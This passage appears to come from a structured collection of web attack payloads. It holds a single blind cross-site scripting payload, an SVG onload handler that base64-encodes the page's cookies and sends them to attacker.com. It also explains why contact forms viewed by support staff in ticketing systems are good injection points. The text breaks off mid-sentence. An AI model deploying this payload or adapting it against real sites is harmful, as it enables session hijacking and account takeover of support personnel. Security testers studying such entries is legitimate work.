    payload_string: <svg/onload=fetch('https://attacker.com/?'+btoa(document.cookie))>
    how_it_works: 'Contact forms are high-value blind XSS injection points because their contents are rendered in email clients
      and web-based ticketing systems. If the ticketing system or email viewer renders HTML without sanitization, the SVG
      onload fires when support staff views the ticket. Using fetch with btoa encoding ensures the full cookie is exfiltrated
